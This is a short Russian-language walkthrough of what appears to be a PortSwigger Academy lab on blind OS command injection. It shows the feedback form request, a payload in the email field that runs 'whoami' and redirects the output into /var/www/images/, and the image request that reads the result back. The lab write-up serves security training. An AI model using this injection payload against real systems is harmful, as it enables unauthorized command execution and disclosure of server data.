Веб ресурс имеет уязвимость в поле отправки обратной связи. Зайдем в него и посмотрим, какой запрос выполняется при отравке формы обратной связи
```
POST /feedback/submit
...
csrf=GwySmnt57CrVics3M4lDx3qhfFLk7nYl&name=1&email=2%402&subject=3&message=4
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/4.%20OS%20command%20injection/3.%20Blind%20OS%20command%20injection%20with%20output%20redirection/pics%20for%20walktrough/3.png)

Ищем уязвимый параметр в запросе, и им оказывается параметр `email`. По заданию известно, что существует путь `/var/www/images/`, где и расположены изображения товаров интернет - магазина. Туда и разместим результат введенной команды. И не забываем про URL-кодировку!
```
2@2||whoami>/var/www/images/output.txt||
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/4.%20OS%20command%20injection/3.%20Blind%20OS%20command%20injection%20with%20output%20redirection/pics%20for%20walktrough/2.png)
Проверим, появился ли файл
```
GET /image?filename=output.txt
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/4.%20OS%20command%20injection/3.%20Blind%20OS%20command%20injection%20with%20output%20redirection/pics%20for%20walktrough/4.png)
